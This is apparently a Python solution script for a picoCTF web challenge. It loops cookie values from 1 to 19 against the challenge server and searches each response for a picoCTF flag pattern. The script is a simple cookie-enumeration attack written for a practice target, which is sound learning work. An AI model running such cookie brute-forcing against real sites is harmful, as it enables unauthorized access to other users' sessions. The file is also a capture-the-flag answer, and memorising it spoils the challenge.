import requests
import re
from time import sleep

url = "http://mercury.picoctf.net:54219/"

# Your cookie (the encoded value)
cookie_value = 1

while cookie_value < 20:
    try:
        print(f"Trying cookie value: {cookie_value}")
        cookies = {"name": str(cookie_value)}
        response = requests.get(url, cookies=cookies)
        print(response.status_code)
        text = str(response.text)
        match = re.findall(r"picoCTF{.*?}", text)
        if match:
            print("It: ")
            print(match)
            break
        else:
            print("Not it")
        cookie_value += 1
        sleep(2)
    except Exception as err:
        print(f"The error: {err}")
    
    